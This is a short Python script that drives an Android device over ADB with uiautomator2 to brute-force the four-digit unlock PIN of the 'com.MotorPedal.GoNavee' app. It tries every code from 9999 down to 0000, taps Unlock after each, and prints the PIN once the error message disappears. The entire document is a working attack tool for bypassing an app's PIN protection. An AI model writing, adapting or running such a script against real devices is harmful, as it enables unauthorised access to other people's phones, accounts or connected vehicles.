import uiautomator2 as u2
import time

# Connect to Android device via ADB
d = u2.connect()

# Enable Fast Input Mode for Faster Typing
d.set_fastinput_ime(True)

# Resource IDs from window_dump.xml
PIN_INPUT_ID = "com.MotorPedal.GoNavee:id/edit_pwd"
UNLOCK_BUTTON_ID = "com.MotorPedal.GoNavee:id/btn_unlock"
ERROR_MESSAGE_ID = "com.MotorPedal.GoNavee:id/tv_error"

def send_pin(pin):
    """Clears old PIN, enters a new one, and clicks Unlock."""
    d(resourceId=PIN_INPUT_ID).clear_text()  
    d(resourceId=PIN_INPUT_ID).set_text(str(pin))  
    d(resourceId=UNLOCK_BUTTON_ID).click()  

def is_unlocked():
    """Detects if Password Error disappears (PIN is correct)."""
    return not d(resourceId=ERROR_MESSAGE_ID).exists  

for pin in range(9999, -1, -1):  
    pin_str = f"{pin:04d}" 
    print(f"🔄 Trying PIN: {pin_str}")

    send_pin(pin_str)  

    if is_unlocked():  
        print(f"✅ SUCCESS! Correct PIN: {pin_str}")
        break  
